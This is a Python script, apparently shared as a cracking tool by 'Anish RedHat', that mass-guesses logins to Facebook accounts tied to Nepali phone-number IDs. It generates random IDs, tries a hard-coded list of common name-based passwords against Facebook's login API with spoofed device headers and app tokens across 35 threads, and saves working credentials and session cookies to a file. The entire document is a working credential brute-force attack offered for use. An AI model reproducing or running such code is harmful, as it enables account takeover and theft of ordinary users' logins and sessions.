# ~/ Code with Anish RedHat
# ~/ Simple Random Script From Gifted By Anish RedHat
import uuid
import os, platform, time, sys
import os,sys,time
import datetime,json
import random,string,re
import shutil,uuid,urllib
import zlib,subprocess,bs4
import requests,mechanize,rich
from string import *
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as AnishGod
princp=[]
usr=[]
loop = 0
bou = []
oks = []
cps = []
method = []
password = []
rr = random.randint
rc = random.choice

def Anish():
	END = '[FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; INE-LX1r Build/HUAWEIINE-LX1r).{random.randint(111111,999999)}.{random.randint(111,999)})'+END
	return ua

M="\033[1;31m" 
W = '\x1b[1;97m' #white 
Y = '\x1b[1;93m' #yellow 
S = '\x1b[1;96m' #sky_blue    
H="\033[1;33m"               
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
X='\033[1;30m'

def clear():
	os.system('clear')

def Anish_rndm():
    clear()
    print(f'[#] I AM OBSESSED WITH PROGRAMMING.JUST DO IT.PROGRAMMING IS THE POETRY OF LOGIC."PROGRAMMING IS THE CLOSEST THING WE HAVE TO MAGIC."')
    print(f'')
    print(f'[1] NEPAL UID CRACKING')
    anish = input(f'[#] SELECT OPTION : ')
    print(f'')
    if anish in ['1']:Anish.nepal()
    else:Anish_rndm()

class Anish:
    def nepal():
        print(f'EXAMPLE : {G}9815/9814/9861/9840{B}')
        code = input(f'SELECT  : ')
        print(f'')
        print(f'EXAMPLE : {G}10000/20000/30000{B}')
        limit = int(input(f'SELECT  : '))
        print(f'')
        for n in range(limit):
            anishx = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(anishx)
        with AnishGod(max_workers=35) as RedHat:
            tl = str(len(bou))
            print(f"TOTAL ID FROM CRACK : {G}{tl}{B}")
            print(f"NEPAL COUNTRY IDS CLONING STARTED...")
            print(f"\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
            for love in bou:
                ids = code + love
                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','lama123','lama12345','lama@123','gurung','gurung123','gurung12345','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','tamang12345']
                RedHat.submit(crack_rand,ids,passlist)
        print('')    
        print('THE PROCESS HAS BEEN COMPLETED')
        print(f'TOTAL OK : {G}{str(len(oks))}')
        print(f'{B}TOTAL CP : {R}{str(len(cps))}{B}')
        print(f'THANKS FOR USING MY TOOL')    
##------------------[ CRACK-MT ]------------------##
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{M}[{G}ANISH-REDHAT{M}]{W}<>{M}[{Y}%s{M}]{W}<>{M}[{G}ALIVE:%s{M}]'%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US",
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head = {
            "User-Agent": Anish(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[ANISH-OK] {uid} | {pas}')
                open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'Please Confirm Email' in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[ANISH-OK] {uid} | {pas}')
                open('/sdcard/ANISH-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/ANISH-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

Anish_rndm()